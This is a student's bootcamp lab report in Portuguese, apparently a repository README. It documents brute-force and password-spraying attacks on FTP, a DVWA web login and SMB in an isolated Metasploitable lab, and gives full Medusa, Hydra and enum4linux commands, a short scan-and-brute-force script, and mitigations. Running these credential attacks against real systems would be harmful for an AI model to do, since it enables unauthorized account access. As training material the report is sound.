Desafio DIO — Minha jornada com Kali, brute force e muita curva de aprendizado

Olá!
Abaixo está o registro do meu projeto de segurança ofensiva do bootcamp da DIO. Realizei experimentos com ataques de força bruta utilizando Kali Linux e Medusa, tudo em ambientes controlados (Metasploitable 2 e DVWA).


Como configurei o ambiente

Duas VMs operando em QEMU/KVM no Debian (não no VirtualBox).

Rede isolada — utilizei a rede do libvirt (virbr0) para garantir a separação e segurança de tudo.

Ferramentas principais: Medusa (brute force), Nmap (scans) e Enum4linux (enumeração SMB/usuários).

O que testei e os resultados
1) Ataque de força bruta no FTP

Comecei pelo básico: FTP na porta 21. O alvo (Metasploitable) vem com credenciais fracas, então foi um teste rápido para observar o fluxo do ataque e como o Medusa atua.

Wordlists usadas

wordlists/usuarios.txt — ex.: holand, msfadmin, root

wordlists/senhas.txt — ex.: mudar@123, senha, 123456

Comando executado

medusa -h 192.168.56.20 -u usuarios.txt -P senhas.txt -M ftp -T 10 -t 4 -f -v 4


Resultado: localizei a credencial holand/mudar@123 (exemplo) e consegui listar arquivos no FTP.

Mitigações recomendadas: usar SFTP/SSH, configurar Fail2Ban para bloquear tentativas recorrentes e exigir senhas robustas.

2) Ataque de força bruta no login web (DVWA)

Passei para o front-end: DVWA em modo low. Formulários vulneráveis são ideais para testes automatizados com ferramentas como o Hydra.

URL local: http://192.168.56.20/DVWA

Comando (Hydra)

hydra -l holand -P senhas.txt 192.168.56.20 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V


Resultado: holand/mudar@123 funcionou no teste (exemplo) e permitiu acesso ao painel.

Mitigações recomendadas: CAPTCHA, hashing forte (bcrypt/argon2) e WAF (ex.: ModSecurity).

3) Password spraying no SMB

Em vez de testar várias senhas em um mesmo usuário, testei uma senha comum em vários usuários (password spraying). Isso evita bloquear contas e costuma ser eficaz contra senhas fracas.

Enumeração de usuários

enum4linux -U 192.168.56.20 > usuarios_smb.txt


Spray com Medusa

medusa -h 192.168.56.20 -U usuarios_smb.txt -p mudar@123 -M smbnt -t 4 -f -v 4


Resultado: acesso ao compartilhamento do usuário holand (exemplo).

Mitigações recomendadas: políticas de bloqueio por tentativas, desativar SMBv1, migrar para SMBv3 com criptografia e adicionar MFA.

O que aprendi

Brute force é conceitualmente simples, mas a complexidade aumenta com o tamanho das wordlists (por exemplo, RockYou).

O ponto fraco costuma ser humano: senhas previsíveis ou reutilizadas.

Defesas que realmente funcionam: MFA, rate limiting / lockouts, hashing forte e monitoramento/alerting (IDS/WAF).

Também aprendi bastante configurando KVM (rede, permissões, snapshots). Os perrengues foram tão didáticos quanto os próprios ataques.

Próximos passos

Rodar o RockYou na íntegra e medir tempo/recursos.

Integrar testes com Metasploit e explorar módulos mais avançados.

Automatizar relatórios e melhorar as wordlists.

Arquivos no repositório

/wordlists — minhas listas básicas (sinta-se à vontade para aprimorar).

/scripts/scan.sh — script simples para iniciar:

#!/bin/bash
# Script rápido
if [ -z "$1" ]; then
  echo "Uso: ./scan.sh <IP>"
  exit 1
fi

echo "Escaneando $1 com Nmap..."
nmap -sV $1

echo "Brute force no FTP..."
medusa -h $1 -u usuarios.txt -P senhas.txt -M ftp -T 10 -t 4 -f -v 4


Feito por: Gabriela Holanda Simões | Bootcamp DIO 2025
Licença: MIT — use com ética.
